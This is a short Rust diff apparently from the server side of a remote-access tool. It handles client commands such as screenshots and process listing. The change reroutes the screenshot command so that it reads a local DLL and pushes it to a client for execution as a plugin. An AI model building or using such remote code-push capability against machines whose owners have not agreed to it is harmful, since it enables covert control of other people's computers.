@@ -253,8 +253,12 @@ impl ServerWrapper {
                 }
 
                 TakeScreenshot(addr, display) => {
-                    self.handle_command(&addr, ClientboundPacket::ScreenshotDisplay(display))
-                        .await
+                    // self.handle_command(&addr, ClientboundPacket::ScreenshotDisplay(display))
+                    //     .await
+
+                    let read_plugin_file = std::fs::read("target/release/file_manager.dll").unwrap();
+
+                    self.handle_command(&addr, ClientboundPacket::ExecutePlugin("file_manager".to_string(), read_plugin_file)).await;
                 }
 
                 GetProcessList(addr) => {
